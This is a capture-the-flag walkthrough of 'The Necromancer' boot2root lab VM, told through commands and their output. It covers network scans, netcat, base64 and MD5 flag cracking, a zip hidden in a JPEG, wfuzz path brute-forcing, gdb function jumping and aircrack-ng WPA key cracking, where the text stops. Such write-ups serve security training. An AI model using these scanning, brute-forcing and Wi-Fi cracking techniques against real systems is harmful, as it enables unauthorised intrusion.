## The Necromancer: 1

### info

```
Title: The Necromancer

File: necromancer.ova

md5sum: 6c4cbb7776acac8c3fba27a0c4c8c98f

sha1sum: 712d4cfc19199dea92792e64a43ae7ac59b1dd05

Size: 345MB

Hypervisor: Created with VirtualBox 5.0.20. Tested with virtualbox and vmware player.

Author: @xerubus

Test Bunnies: @dooktwit and @RobertWinkel

Difficulty: Beginner
Description

The Necromancer boot2root box was created for a recent SecTalks Brisbane CTF competition.

There are 11 flags to collect on your way to solving the challenging, and the difficulty level is considered as beginner.

The end goal is simple... destroy The Necromancer!
Notes

    DHCP (Automatically assigned)
    IMPORTANT: The vm IS working as intended if you receive a successful DHCP lease as seen in the boot up sequence.
    The Necromancer VM MUST be on the same subnet as the attacking machine. Ideally both the boot2root VM and the attacking machine should be on the same HostOnly network. If you choose to use a physical box as the attacking machine, the boot2root VM must exist on the same network via a bridged interface.

```

### discovery

```
root@kali:~# netdiscover -r 192.168.93.0/24
 Currently scanning: Finished!   |   Screen View: Unique Hosts

 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.93.1    00:50:56:c0:00:08      1      60  VMware, Inc.
 192.168.93.2    00:50:56:fe:26:a7      1      60  VMware, Inc.
 192.168.93.137  00:0c:29:06:d5:9d      1      60  VMware, Inc.
 192.168.93.254  00:50:56:fd:87:3c      1      60  VMware, Inc.
```

### nmap scan

```
root@kali:~# nmap 192.168.93.137 -sV -p- -sC -Pn

Starting Nmap 7.12 ( https://nmap.org ) at 2016-07-17 09:32 BST
Nmap scan report for 192.168.93.137
Host is up (0.00062s latency).
All 65535 scanned ports on 192.168.93.137 are filtered
MAC Address: 00:0C:29:06:D5:9D (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1331.54 seconds
```

hmmmmmmm

```
root@kali:~# nmap 192.168.93.137 -sV -sU -sT -Pn -T4 -p1-1000

Starting Nmap 7.12 ( https://nmap.org ) at 2016-07-17 10:17 BST

Nmap scan report for 192.168.93.137
Host is up (0.00052s latency).
Not shown: 1000 filtered ports, 999 open|filtered ports
PORT    STATE SERVICE VERSION
666/udp open  doom?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port666-UDP:V=7.12%I=7%D=7/17%Time=578B4D48%P=i586-pc-linux-gnu%r(RPCCh
SF:eck,27,"You\x20gasp\x20for\x20air!\x20Time\x20is\x20running\x20out!\n")
SF:%r(DNSVersionBindReq,27,"You\x20gasp\x20for\x20air!\x20Time\x20is\x20ru
SF:nning\x20out!\n")%r(DNSStatusRequest,27,"You\x20gasp\x20for\x20air!\x20
SF:Time\x20is\x20running\x20out!\n")%r(NBTStat,27,"You\x20gasp\x20for\x20a
SF:ir!\x20Time\x20is\x20running\x20out!\n")%r(Help,27,"You\x20gasp\x20for\
SF:x20air!\x20Time\x20is\x20running\x20out!\n")%r(SIPOptions,27,"You\x20ga
SF:sp\x20for\x20air!\x20Time\x20is\x20running\x20out!\n")%r(Sqlping,27,"Yo
SF:u\x20gasp\x20for\x20air!\x20Time\x20is\x20running\x20out!\n")%r(NTPRequ
SF:est,27,"You\x20gasp\x20for\x20air!\x20Time\x20is\x20running\x20out!\n")
SF:%r(SNMPv1public,27,"You\x20gasp\x20for\x20air!\x20Time\x20is\x20running
SF:\x20out!\n")%r(SNMPv3GetRequest,27,"You\x20gasp\x20for\x20air!\x20Time\
SF:x20is\x20running\x20out!\n")%r(xdmcp,27,"You\x20gasp\x20for\x20air!\x20
SF:Time\x20is\x20running\x20out!\n")%r(AFSVersionRequest,27,"You\x20gasp\x
SF:20for\x20air!\x20Time\x20is\x20running\x20out!\n")%r(DNS-SD,27,"You\x20
SF:gasp\x20for\x20air!\x20Time\x20is\x20running\x20out!\n")%r(Citrix,27,"Y
SF:ou\x20gasp\x20for\x20air!\x20Time\x20is\x20running\x20out!\n")%r(Kerber
SF:os,27,"You\x20gasp\x20for\x20air!\x20Time\x20is\x20running\x20out!\n")%
SF:r(sybaseanywhere,27,"You\x20gasp\x20for\x20air!\x20Time\x20is\x20runnin
SF:g\x20out!\n")%r(NetMotionMobility,27,"You\x20gasp\x20for\x20air!\x20Tim
SF:e\x20is\x20running\x20out!\n");
MAC Address: 00:0C:29:06:D5:9D (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 3182.93 seconds
```

that was painful but looks like something is there

### port 666 doom

```
root@kali:~# nc 192.168.93.137 666 -u

You gasp for air! Time is running out!

You gasp for air! Time is running out!
```

### network enumeration

as not getting anywhere on port 666 nor are other ports davalaiable, maybe the VM is connecting or something on the network.

```
root@kali:~# tshark host 192.168.93.137
Running as user "root" and group "root". This could be dangerous.
tshark: Lua: Error during loading:
 [string "/usr/share/wireshark/init.lua"]:44: dofile has been disabled due to running Wireshark as superuser. See https://wiki.wireshark.org/CaptureSetup/CapturePrivileges for help in running Wireshark as an unprivileged user.
Capturing on 'eth0'
```

interestingly there is to what looks like a broadcast on the network and then a packet sent to the hosts it sees alive on port 4444

```
122 15.626913571 Vmware_06:d5:9d -> Broadcast    ARP 60 Who has 192.168.93.123? Tell 192.168.93.137
123 15.629359127 Vmware_06:d5:9d -> Broadcast    ARP 60 Who has 192.168.93.124? Tell 192.168.93.137
124 15.631697198 Vmware_06:d5:9d -> Broadcast    ARP 60 Who has 192.168.93.125? Tell 192.168.93.137
125 15.634474904 Vmware_06:d5:9d -> Broadcast    ARP 60 Who has 192.168.93.126? Tell 192.168.93.137
126 15.638024532 Vmware_06:d5:9d -> Broadcast    ARP 60 Who has 192.168.93.127? Tell 192.168.93.137
127 15.640515552 192.168.93.137 -> 192.168.93.128 TCP 78 38845 → 4444 [SYN] Seq=0 Win=16384 Len=0 MSS=1460 SACK_PERM=1 WS=8 TSval=3862799748 TSecr=0
128 15.640618200 192.168.93.128 -> 192.168.93.137 TCP 54 4444 → 38845 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0
129 15.643427166 Vmware_06:d5:9d -> Broadcast    ARP 60 Who has 192.168.93.129? Tell 192.168.93.137
130 15.646257592 Vmware_06:d5:9d -> Broadcast    ARP 60 Who has 192.168.93.130? Tell 192.168.93.137
131 15.648732371 Vmware_06:d5:9d -> Broadcast    ARP 60 Who has 192.168.93.131? Tell 192.168.93.137
132 15.651150246 Vmware_06:d5:9d -> Broadcast    ARP 60 Who has 192.168.93.132? Tell 192.168.93.137
133 15.653739867 Vmware_06:d5:9d -> Broadcast    ARP 60 Who has 192.168.93.133? Tell 192.168.93.137
```

### port 4444

```
root@kali:~# nc -nlvp 4444
listening on [any] 4444 ...
connect to [192.168.93.128] from (UNKNOWN) [192.168.93.137] 44664
...V2VsY29tZSENCg0KWW91IGZpbmQgeW91cnNlbGYgc3RhcmluZyB0b3dhcmRzIHRoZSBob3Jpem9uLCB3aXRoIG5vdGhpbmcgYnV0IHNpbGVuY2Ugc3Vycm91bmRpbmcgeW91Lg0KWW91IGxvb2sgZWFzdCwgdGhlbiBzb3V0aCwgdGhlbiB3ZXN0LCBhbGwgeW91IGNhbiBzZWUgaXMgYSBncmVhdCB3YXN0ZWxhbmQgb2Ygbm90aGluZ25lc3MuDQoNClR1cm5pbmcgdG8geW91ciBub3J0aCB5b3Ugbm90aWNlIGEgc21hbGwgZmxpY2tlciBvZiBsaWdodCBpbiB0aGUgZGlzdGFuY2UuDQpZb3Ugd2FsayBub3J0aCB0b3dhcmRzIHRoZSBmbGlja2VyIG9mIGxpZ2h0LCBvbmx5IHRvIGJlIHN0b3BwZWQgYnkgc29tZSB0eXBlIG9mIGludmlzaWJsZSBiYXJyaWVyLiAgDQoNClRoZSBhaXIgYXJvdW5kIHlvdSBiZWdpbnMgdG8gZ2V0IHRoaWNrZXIsIGFuZCB5b3VyIGhlYXJ0IGJlZ2lucyB0byBiZWF0IGFnYWluc3QgeW91ciBjaGVzdC4gDQpZb3UgdHVybiB0byB5b3VyIGxlZnQuLiB0aGVuIHRvIHlvdXIgcmlnaHQhICBZb3UgYXJlIHRyYXBwZWQhDQoNCllvdSBmdW1ibGUgdGhyb3VnaCB5b3VyIHBvY2tldHMuLiBub3RoaW5nISAgDQpZb3UgbG9vayBkb3duIGFuZCBzZWUgeW91IGFyZSBzdGFuZGluZyBpbiBzYW5kLiAgDQpEcm9wcGluZyB0byB5b3VyIGtuZWVzIHlvdSBiZWdpbiB0byBkaWcgZnJhbnRpY2FsbHkuDQoNCkFzIHlvdSBkaWcgeW91IG5vdGljZSB0aGUgYmFycmllciBleHRlbmRzIHVuZGVyZ3JvdW5kISAgDQpGcmFudGljYWxseSB5b3Uga2VlcCBkaWdnaW5nIGFuZCBkaWdnaW5nIHVudGlsIHlvdXIgbmFpbHMgc3VkZGVubHkgY2F0Y2ggb24gYW4gb2JqZWN0Lg0KDQpZb3UgZGlnIGZ1cnRoZXIgYW5kIGRpc2NvdmVyIGEgc21hbGwgd29vZGVuIGJveC4gIA0KZmxhZzF7ZTYwNzhiOWIxYWFjOTE1ZDExYjlmZDU5NzkxMDMwYmZ9IGlzIGVuZ3JhdmVkIG9uIHRoZSBsaWQuDQoNCllvdSBvcGVuIHRoZSBib3gsIGFuZCBmaW5kIGEgcGFyY2htZW50IHdpdGggdGhlIGZvbGxvd2luZyB3cml0dGVuIG9uIGl0LiAiQ2hhbnQgdGhlIHN0cmluZyBvZiBmbGFnMSAtIHU2NjYi...
```

```
root@kali:~# echo "V2VsY29tZSENCg0KWW91IGZpbmQgeW91cnNlbGYgc3RhcmluZyB0b3dhcmRzIHRoZSBob3Jpem9uLCB3aXRoIG5vdGhpbmcgYnV0IHNpbGVuY2Ugc3Vycm91bmRpbmcgeW91Lg0KWW91IGxvb2sgZWFzdCwgdGhlbiBzb3V0aCwgdGhlbiB3ZXN0LCBhbGwgeW91IGNhbiBzZWUgaXMgYSBncmVhdCB3YXN0ZWxhbmQgb2Ygbm90aGluZ25lc3MuDQoNClR1cm5pbmcgdG8geW91ciBub3J0aCB5b3Ugbm90aWNlIGEgc21hbGwgZmxpY2tlciBvZiBsaWdodCBpbiB0aGUgZGlzdGFuY2UuDQpZb3Ugd2FsayBub3J0aCB0b3dhcmRzIHRoZSBmbGlja2VyIG9mIGxpZ2h0LCBvbmx5IHRvIGJlIHN0b3BwZWQgYnkgc29tZSB0eXBlIG9mIGludmlzaWJsZSBiYXJyaWVyLiAgDQoNClRoZSBhaXIgYXJvdW5kIHlvdSBiZWdpbnMgdG8gZ2V0IHRoaWNrZXIsIGFuZCB5b3VyIGhlYXJ0IGJlZ2lucyB0byBiZWF0IGFnYWluc3QgeW91ciBjaGVzdC4gDQpZb3UgdHVybiB0byB5b3VyIGxlZnQuLiB0aGVuIHRvIHlvdXIgcmlnaHQhICBZb3UgYXJlIHRyYXBwZWQhDQoNCllvdSBmdW1ibGUgdGhyb3VnaCB5b3VyIHBvY2tldHMuLiBub3RoaW5nISAgDQpZb3UgbG9vayBkb3duIGFuZCBzZWUgeW91IGFyZSBzdGFuZGluZyBpbiBzYW5kLiAgDQpEcm9wcGluZyB0byB5b3VyIGtuZWVzIHlvdSBiZWdpbiB0byBkaWcgZnJhbnRpY2FsbHkuDQoNCkFzIHlvdSBkaWcgeW91IG5vdGljZSB0aGUgYmFycmllciBleHRlbmRzIHVuZGVyZ3JvdW5kISAgDQpGcmFudGljYWxseSB5b3Uga2VlcCBkaWdnaW5nIGFuZCBkaWdnaW5nIHVudGlsIHlvdXIgbmFpbHMgc3VkZGVubHkgY2F0Y2ggb24gYW4gb2JqZWN0Lg0KDQpZb3UgZGlnIGZ1cnRoZXIgYW5kIGRpc2NvdmVyIGEgc21hbGwgd29vZGVuIGJveC4gIA0KZmxhZzF7ZTYwNzhiOWIxYWFjOTE1ZDExYjlmZDU5NzkxMDMwYmZ9IGlzIGVuZ3JhdmVkIG9uIHRoZSBsaWQuDQoNCllvdSBvcGVuIHRoZSBib3gsIGFuZCBmaW5kIGEgcGFyY2htZW50IHdpdGggdGhlIGZvbGxvd2luZyB3cml0dGVuIG9uIGl0LiAiQ2hhbnQgdGhlIHN0cmluZyBvZiBmbGFnMSAtIHU2NjYi" | base64 -d
Welcome!

You find yourself staring towards the horizon, with nothing but silence surrounding you.
You look east, then south, then west, all you can see is a great wasteland of nothingness.

Turning to your north you notice a small flicker of light in the distance.
You walk north towards the flicker of light, only to be stopped by some type of invisible barrier.

The air around you begins to get thicker, and your heart begins to beat against your chest.
You turn to your left.. then to your right!  You are trapped!

You fumble through your pockets.. nothing!
You look down and see you are standing in sand.
Dropping to your knees you begin to dig frantically.

As you dig you notice the barrier extends underground!
Frantically you keep digging and digging until your nails suddenly catch on an object.

You dig further and discover a small wooden box.
flag1{e6078b9b1aac915d11b9fd59791030bf} is engraved on the lid.

You open the box, and find a parchment with the following written on it. "Chant the string of flag1 - u666"root@kali:~#

```
using [https://hashkiller.co.uk/md5-decrypter.aspx](https://hashkiller.co.uk/md5-decrypter.aspx) cracked the flag to `opensesame`

### back to port 666

```
root@kali:~/necro# nc 192.168.93.137 666 -u

You gasp for air! Time is running out!
opensesame


A loud crack of thunder sounds as you are knocked to your feet!

Dazed, you start to feel fresh air entering your lungs.

You are free!

In front of you written in the sand are the words:

flag2{c39cd4df8f2e35d20d92c2e44de5f7c6}

As you stand to your feet you notice that you can no longer see the flicker of light in the distance.

You turn frantically looking in all directions until suddenly, a murder of crows appear on the horizon.

As they get closer you can see one of the crows is grasping on to an object. As the sun hits the object, shards of light beam from its surface.

The birds get closer, and closer, and closer.

Staring up at the crows you can see they are in a formation.

Squinting your eyes from the light coming from the object, you can see the formation looks like the numeral 80.

As quickly as the birds appeared, they have left you once again.... alone... tortured by the deafening sound of silence.

666 is closed.
```

using [https://hashkiller.co.uk/md5-decrypter.aspx](https://hashkiller.co.uk/md5-decrypter.aspx) cracked the flag to `1033750779`

### scan again

```
root@kali:~# nmap 192.168.93.137 -sV -p- -sC -Pn

Starting Nmap 7.12 ( https://nmap.org ) at 2016-07-17 11:25 BST
Nmap scan report for 192.168.93.137
Host is up (0.00044s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    OpenBSD httpd
|_http-server-header: OpenBSD httpd
|_http-title: The Chasm
MAC Address: 00:0C:29:06:D5:9D (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 118.08 seconds
```

### port 80

```
root@kali:~/necro# curl http://192.168.93.137
<html>
  <head>
    <title>The Chasm</title>
  </head>
  <body bgcolor="#000000" link="green" vlink="green" alink="green">
    <font color="green">
    Hours have passed since you first started to follow the crows.<br><br>
    Silence continues to engulf you as you treck towards a mountain range on the horizon.<br><br>
    More times passes and you are now standing in front of a great chasm.<br><br>
    Across the chasm you can see a necromancer standing in the mouth of a cave, staring skyward at the circling crows.<br><br>
    As you step closer to the chasm, a rock dislodges from beneath your feet and falls into the dark depths.<br><br>
    The necromancer looks towards you with hollow eyes which can only be described as death.<br><br>
    He smirks in your direction, and suddenly a bright light momentarily blinds you.<br><br>
    The silence is broken by a blood curdling screech of a thousand birds, followed by the necromancers laughs fading as he decends into the cave!<br><br>
    The crows break their formation, some flying aimlessly in the air; others now motionless upon the ground.<br><br>
    The cave is now protected by a gaseous blue haze, and an organised pile of feathers lay before you.<br><br>
    <img src="/pics/pileoffeathers.jpg">
    <p><font size=2>Image copyright: <a href="http://www.featherfolio.com/" target=_blank>Chris Maynard</a></font></p>
    </font>
  </body>
</html>
```

```
root@kali:~/necro# wget http://192.168.93.137/pics/pileoffeathers.jpg
--2016-07-17 11:34:36--  http://192.168.93.137/pics/pileoffeathers.jpg
Connecting to 192.168.93.137:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 37289 (36K) [image/jpeg]
Saving to: ‘pileoffeathers.jpg’

pileoffeathers.jpg                100%[==========================================================>]  36.42K  --.-KB/s    in 0s

2016-07-17 11:34:36 (368 MB/s) - ‘pileoffeathers.jpg’ saved [37289/37289]

```

any scanner seems to show nothing so enumeration of the picture

```
root@kali:~/necro# binwalk ./pileoffeathers.jpg

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, EXIF standard
12            0xC             TIFF image data, little-endian offset of first image directory: 8
270           0x10E           Unix path: /www.w3.org/1999/02/22-rdf-syntax-ns#"> <rdf:Description rdf:about="" xmlns:xmp="http://ns.adobe.com/xap/1.0/" xmlns:xmpMM="http
36994         0x9082          Zip archive data, at least v2.0 to extract, compressed size: 121, uncompressed size: 125, name: feathers.txt
37267         0x9193          End of Zip archive
```
`root@kali:~/necro# cp pileoffeathers.jpg pileoffeathers.zip`

```
root@kali:~/necro# unzip ./pileoffeathers.zip
Archive:  ./pileoffeathers.zip
warning [./pileoffeathers.zip]:  36994 extra bytes at beginning or within zipfile
  (attempting to process anyway)
  inflating: feathers.txt
```

```
root@kali:~/necro# cat feathers.txt
ZmxhZzN7OWFkM2Y2MmRiN2I5MWMyOGI2ODEzNzAwMDM5NDYzOWZ9IC0gQ3Jvc3MgdGhlIGNoYXNtIGF0IC9hbWFnaWNicmlkZ2VhcHBlYXJzYXR0aGVjaGFzbQ==
```
```
root@kali:~/necro# cat feathers.txt | base64 -d
flag3{9ad3f62db7b91c28b68137000394639f} - Cross the chasm at /amagicbridgeappearsatthechasm
```

using [https://hashkiller.co.uk/md5-decrypter.aspx](https://hashkiller.co.uk/md5-decrypter.aspx) cracked the flag to `345465869`

```
root@kali:~/necro# curl http://192.168.93.137/amagicbridgeappearsatthechasm/
<html>
  <head>
    <title>The Cave</title>
  </head>
  <body bgcolor="#000000" link="green" vlink="green" alink="green">
    <font color="green">
    You cautiously make your way across chasm.<br><br>
    You are standing on a snow covered plateau, surrounded by shear cliffs of ice and stone.<br><br>
    The cave before you is protected by some sort of spell cast by the necromancer.<br><br>
    You reach out to touch the gaseous blue haze, and can feel life being drawn from your soul the closer you get.<br><br>
    Hastily you take a few steps back away from the cave entrance.<br><br>
    There must be a magical item that could protect you from the necromancer's spell.<br><br>
    <img src="../pics/magicbook.jpg">
    </font>
  </body>
</html>
```
using wfuzz with a wordlist i would normally use to crack password hashes actually found `talisman`

```
root@kali:~/necro# wfuzz -w /usr/share/wordlists/rockyou.txt --sc 200 http://192.168.93.137/amagicbridgeappearsatthechasm/FUZZ
********************************************************
* Wfuzz 2.1.3 - The Web Bruteforcer                      *
********************************************************

Target: http://192.168.93.137/amagicbridgeappearsatthechasm/FUZZ
Total requests: 14344392

==================================================================
ID	Response   Lines      Word         Chars          Request
==================================================================

04706:  C=200     16 L	     103 W	    755 Ch	  ""
04798:  C=200     16 L	     103 W	    755 Ch	  "#1bitch"
14862:  C=200     16 L	     103 W	    755 Ch	  "#1pimp"
15155:  C=200     16 L	     103 W	    755 Ch	  "#1hottie"
15937:  C=200     16 L	     103 W	    755 Ch	  "#1princess"
16757:  C=200     16 L	     103 W	    755 Ch	  "#1stunna"
20621:  C=200     16 L	     103 W	    755 Ch	  "#1love"
22467:  C=200     16 L	     103 W	    755 Ch	  "#1angel"
22805:  C=200      9 L	     109 W	   9676 Ch	  "talisman"
```

```
root@kali:~/necro# wget http://192.168.93.137/amagicbridgeappearsatthechasm/talisman
--2016-07-17 12:57:53--  http://192.168.93.137/amagicbridgeappearsatthechasm/talisman
Connecting to 192.168.93.137:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 9676 (9.4K) [application/octet-stream]
Saving to: ‘talisman’

talisman                                100%[=============================================================================>]   9.45K  --.-KB/s    in 0s

2016-07-17 12:57:53 (218 MB/s) - ‘talisman’ saved [9676/9676]
```
```
root@kali:~/necro# file talisman
talisman: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=2b131df906087adf163f8cba1967b3d2766e639d, not stripped
```

```
root@kali:~/necro# chmod +x ./talisman
root@kali:~/necro# ./talisman
You have found a talisman.

The talisman is cold to the touch, and has no words or symbols on it's surface.

Do you want to wear the talisman?  neck

Nothing happens.
```

using gdb-peda i did find the next flag, but i'll be honest here linux binary debugging is my weak point and i just chose the functions that fit the theme for this VM.

```
root@kali:~/necro# gdb -q ./talisman
Reading symbols from ./talisman...(no debugging symbols found)...done.
gdb-peda$ info functions
All defined functions:

Non-debugging symbols:
0x080482d0  _init
0x08048310  printf@plt
0x08048320  __libc_start_main@plt
0x08048330  __isoc99_scanf@plt
0x08048350  _start
0x08048380  __x86.get_pc_thunk.bx
0x08048390  deregister_tm_clones
0x080483c0  register_tm_clones
0x08048400  __do_global_dtors_aux
0x08048420  frame_dummy
0x0804844b  unhide
0x0804849d  hide
0x080484f4  myPrintf
0x08048529  wearTalisman
0x08048a13  main
0x08048a37  chantToBreakSpell
0x08049530  __libc_csu_init
0x08049590  __libc_csu_fini
0x08049594  _fini
```
```
gdb-peda$ b wearTalisman
Breakpoint 1 at 0x804852d
```
```
gdb-peda$ jump chantToBreakSpell
The program is not being run.
```
```
gdb-peda$ run
Starting program: /root/necro/talisman
[----------------------------------registers-----------------------------------]
EAX: 0xb7fb4dbc --> 0xbffff5ec --> 0xbffff73c ("LC_PAPER=en_US.UTF-8")
EBX: 0x0
ECX: 0xbffff550 --> 0x1
EDX: 0xbffff574 --> 0x0
ESI: 0xb7fb3000 --> 0x1aedb0
EDI: 0xb7fb3000 --> 0x1aedb0
EBP: 0xbffff528 --> 0xbffff538 --> 0x0
ESP: 0xbffff524 --> 0xb7fb3000 --> 0x1aedb0
EIP: 0x804852d (<wearTalisman+4>:	sub    esp,0x1b4)
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048529 <wearTalisman>:	push   ebp
   0x804852a <wearTalisman+1>:	mov    ebp,esp
   0x804852c <wearTalisman+3>:	push   edi
=> 0x804852d <wearTalisman+4>:	sub    esp,0x1b4
   0x8048533 <wearTalisman+10>:	lea    edx,[ebp-0x1ac]
   0x8048539 <wearTalisman+16>:	mov    eax,0x0
   0x804853e <wearTalisman+21>:	mov    ecx,0x64
   0x8048543 <wearTalisman+26>:	mov    edi,edx
[------------------------------------stack-------------------------------------]
0000| 0xbffff524 --> 0xb7fb3000 --> 0x1aedb0
0004| 0xbffff528 --> 0xbffff538 --> 0x0
0008| 0xbffff52c --> 0x8048a29 (<main+22>:	mov    eax,0x0)
0012| 0xbffff530 --> 0xb7fb33dc --> 0xb7fb41e0 --> 0x0
0016| 0xbffff534 --> 0xbffff550 --> 0x1
0020| 0xbffff538 --> 0x0
0024| 0xbffff53c --> 0xb7e1c5f7 (<__libc_start_main+247>:	add    esp,0x10)
0028| 0xbffff540 --> 0xb7fb3000 --> 0x1aedb0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0804852d in wearTalisman ()
```
```
gdb-peda$ jump chantToBreakSpell
Continuing at 0x8048a3b.
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
You fall to your knees.. weak and weary.
Looking up you can see the spell is still protecting the cave entrance.
The talisman is now almost too hot to touch!
Turning it over you see words now etched into the surface:
flag4{ea50536158db50247e110a6c89fcf3d3}
Chant these words at u31337
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
[Inferior 1 (process 13746) exited normally]
Warning: not running or target is remote
```
using [https://hashkiller.co.uk/md5-decrypter.aspx](https://hashkiller.co.uk/md5-decrypter.aspx) cracked the flag to `blackmagic`


```
root@kali:~# echo "blackmagic" | nc 192.168.93.137 31337 -u


As you chant the words, a hissing sound echoes from the ice walls.

The blue aura disappears from the cave entrance.

You enter the cave and see that it is dimly lit by torches; shadows dancing against the rock wall as you descend deeper and deeper into the mountain.

You hear high pitched screeches coming from within the cave, and you start to feel a gentle breeze.

The screeches are getting closer, and with it the breeze begins to turn into an ice cold wind.

Suddenly, you are attacked by a swarm of bats!

You aimlessly thrash at the air in front of you!

The bats continue their relentless attack, until.... silence.

Looking around you see no sign of any bats, and no indication of the struggle which had just occurred.

Looking towards one of the torches, you see something on the cave wall.

You walk closer, and notice a pile of mutilated bats lying on the cave floor.  Above them, a word etched in blood on the wall.

/thenecromancerwillabsorbyoursoul

flag5{0766c36577af58e15545f099a3b15e60}

```
using [https://hashkiller.co.uk/md5-decrypter.aspx](https://hashkiller.co.uk/md5-decrypter.aspx) cracked the flag to `809472671`


```
root@kali:~/necro# curl http://192.168.93.137/thenecromancerwillabsorbyoursoul/
<html>
  <head>
    <title>The Door</title>
  </head>
  <body bgcolor="#000000" link="green" vlink="green" alink="green">
    <font color="green">
    flag6{b1c3ed8f1db4258e4dcb0ce565f6dc03}<br><br>
    You continue to make your way through the cave.<br><br>
    In the distance you can see a familiar flicker of light moving in and out of the shadows. <br><br>
    As you get closer to the light you can hear faint footsteps, followed by the sound of a heavy door opening.<br><br>
    You move closer, and then stop frozen with fear.<br><br>
    It's the <a href="./necromancer">necromancer!</a><br><br>
   <img src="../pics/necromancer.jpg">
    <p><font size=2>Image copyright:<a href="http://www.deviantart.com/art/The-Warlock-Necromancer-339634655" target=_blank> Manzanedo</a></font>
</p><br><br><br>
    Again he stares at you with deathly hollow eyes.  <br><br>
    He is standing in a doorway; a staff in one hand, and an object in the other.  <br><br>
    Smirking, the necromancer holds the staff and the object in the air.<br><br>
    He points his staff in your direction, and the stench of death and decay begins to fill the air.<br><br>
    You stare into his eyes and then.......<br><br><br><br><br><br><br><br><br>
    ...... darkness.  You open your eyes and find yourself lying on the damp floor of the cave.<br><br>
    The amulet must have saved you from whatever spell the necromancer had cast.<br><br>
    You stand to your feet.  Behind you, only darkness.<br><br>
    Before you, a large door with the symbol of a skull engraved into the surface. <br><br>
    Looking closer at the skull, you can see u161 engraved into the forehead.<br><br>
    </font>
  </body>
</html>
```
using [https://hashkiller.co.uk/md5-decrypter.aspx](https://hashkiller.co.uk/md5-decrypter.aspx) cracked the flag to `1756462165`

possibly seen as an issue with using my mac and sshing to the kali vm but i had to scp the necromancer file over

```
MacBook-Pro:~$ scp Downloads/necromancer root@192.168.93.128:/root/necro
necromancer                                                                                                                 100%   10KB  10.1KB/s   00:00
```

```
root@kali:~/necro# bunzip2 ./necromancer
bunzip2: Can't guess original name for ./necromancer -- using ./necromancer.out
```
```
root@kali:~/necro# file necromancer.out
necromancer.out: POSIX tar archive (GNU)
root@kali:~/necro# tar xvf ./necromancer.out
necromancer.cap
```

```
root@kali:~/necro# nmap -sU 192.168.93.137 -T5  -sV -p161

Starting Nmap 7.12 ( https://nmap.org ) at 2016-07-17 21:48 BST
Nmap scan report for 192.168.93.137
Host is up (0.0023s latency).
PORT    STATE SERVICE VERSION
161/udp open  snmp    net-snmp; net-snmp SNMPv3 server
MAC Address: 00:0C:29:06:D5:9D (VMware)
```

```
root@kali:~# snmpwalk -v3 -c 1756462165 192.168.93.137
snmpwalk: No securityName specified
```

hmmmm

decided to look at the .cap file

```
root@kali:~/necro# tcpdump -r ./necromancer.cap
reading from file ./necromancer.cap, link-type IEEE802_11 (802.11)
08:36:15.245276 Beacon (community) [1.0* 2.0* 5.5* 11.0* 18.0 24.0 36.0 54.0 Mbit] ESS CH: 11, PRIVACY
08:36:15.436228 Clear-To-Send RA:68:64:4b:3d:93:4c (oui Unknown)
08:36:15.577032 Request-To-Send TA:58:98:35:a2:f5:a1 (oui Unknown)
08:36:15.577076 Clear-To-Send RA:58:98:35:a2:f5:a1 (oui Unknown)
08:36:15.577545 Request-To-Send TA:58:98:35:a2:f5:a1 (oui Unknown)
08:36:15.577588 Clear-To-Send RA:58:98:35:a2:f5:a1 (oui Unknown)
08:36:15.577545 Request-To-Send TA:58:98:35:a2:f5:a1 (oui Unknown)
08:36:15.577588 Clear-To-Send RA:58:98:35:a2:f5:a1 (oui Unknown)
08:36:15.578569 Request-To-Send TA:58:98:35:a2:f5:a1 (oui Unknown)
08:36:15.578612 Clear-To-Send RA:58:98:35:a2:f5:a1 (oui Unknown)
08:36:15.579633 BA RA:58:98:35:a2:f5:a1 (oui Unknown)
08:36:15.580653 Request-To-Send TA:e8:de:27:05:b5:c3 (oui Unknown)
08:36:15.581677 Request-To-Send TA:e8:de:27:05:b5:c3 (oui Unknown)
--snip--
```

looks like a lot of wireless authentications, and de auths

```
root@kali:~/necro# aircrack-ng -w /usr/share/wordlists/rockyou.txt necromancer.cap
Opening necromancer.cap
Read 2197 packets.

   #  BSSID              ESSID                     Encryption

   1  C4:12:F5:0D:5E:95  community                 WPA (1 handshake)

Choosing first network as target.

Opening necromancer.cap
Reading packets, please wait...

                                 Aircrack-ng 1.2 rc4

      [00:00:14] 16108/9822768 keys tested (1326.12 k/s)

      Time left: 2 hours, 3 minutes, 15 seconds                  0.16%

                           KEY FOUND! [ death2all ]


      Master Key     : 7C F8 5B 00 BC B6 AB ED B0 53 F9 94 2D 4D B7 AC
                       DB FA 53 6F A9 ED D5 68 79 91 84 7B 7E 6E 0F E7

      Transient Key  : EB 8E 29 CE 8F 13 71 29 AF FF 04 D7 98 4C 32 3C
                       56 8E 6D 41 55 DD B7 E4 3C 65 9A 18 0B BE A3 B3
                       C8 9D 7F EE 13 2D 94 3C 3F B7 27 6B 06 53 EB 92
